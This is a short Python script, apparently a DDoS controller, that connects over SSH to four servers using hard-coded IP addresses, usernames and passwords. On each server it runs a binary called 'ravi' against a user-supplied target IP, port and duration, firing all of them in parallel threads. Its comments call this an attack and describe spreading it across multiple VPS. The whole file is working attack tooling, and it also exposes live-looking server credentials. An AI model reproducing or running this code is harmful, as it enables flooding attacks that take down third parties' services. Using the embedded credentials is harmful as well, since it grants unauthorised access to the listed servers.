import paramiko
import threading

# ✅ VPS LIST (IP, Username, Password)
VPS_LIST = [
    {"host": "167.99.120.129", "user": "master_gyqdyxpuzc", "password": "yJcKAy23DgUh"},
    {"host": "108.61.89.124", "user": "master_rpfumfsfsr", "password": "TbZ9dg9epr7z"},
    {"host": "207.246.127.196", "user": "master_mhfuqyupey", "password": "GT25wRh5JtJP"},
    {"host": "207.148.28.236", "user": "master_rxqswnuenq", "password": "E6EpdNP5KRXw!"}
]

# ✅ Function to send attack command to a VPS
def send_attack(vps, target, port, duration):
    try:
        print(f"🔄 Connecting to {vps['host']}...")
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # ✅ Connect to VPS
        ssh.connect(vps["host"], username=vps["user"], password=vps["password"], timeout=10)

        # ✅ Run Attack Command from "Vps" Folder
        command = f"cd vps && chmod +x ravi && ./ravi {target} {port} {duration} 900"
        stdin, stdout, stderr = ssh.exec_command(command)

        output = stdout.read().decode()
        error = stderr.read().decode()

        if output:
            print(f"✅ Output from {vps['host']}:\n{output}")
        if error:
            print(f"❌ Error from {vps['host']}:\n{error}")

        ssh.close()

    except paramiko.AuthenticationException:
        print(f"❌ Authentication failed for {vps['host']}! Check credentials.")
    except paramiko.SSHException as ssh_ex:
        print(f"⚠ SSH Error on {vps['host']}: {ssh_ex}")
    except Exception as e:
        print(f"🔥 Unexpected error on {vps['host']}: {str(e)}")

# ✅ Function to distribute attack across multiple VPS
def start_attack(target, port, duration):
    threads = []
    for vps in VPS_LIST:
        thread = threading.Thread(target=send_attack, args=(vps, target, port, duration))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()  # ✅ सभी अटैक कम्पलीट होने तक वेट करेगा

# ✅ अगर यह स्क्रिप्ट डायरेक्टली रन हो रही है, तो डेमो अटैक स्टार्ट करें
if __name__ == "__main__":
    import sys
    if len(sys.argv) != 4:
        print("❌ USAGE: python3 multivps.py <IP> <PORT> <DURATION>")
        sys.exit(1)

    target = sys.argv[1]
    port = int(sys.argv[2])
    duration = int(sys.argv[3])

    start_attack(target, port, duration)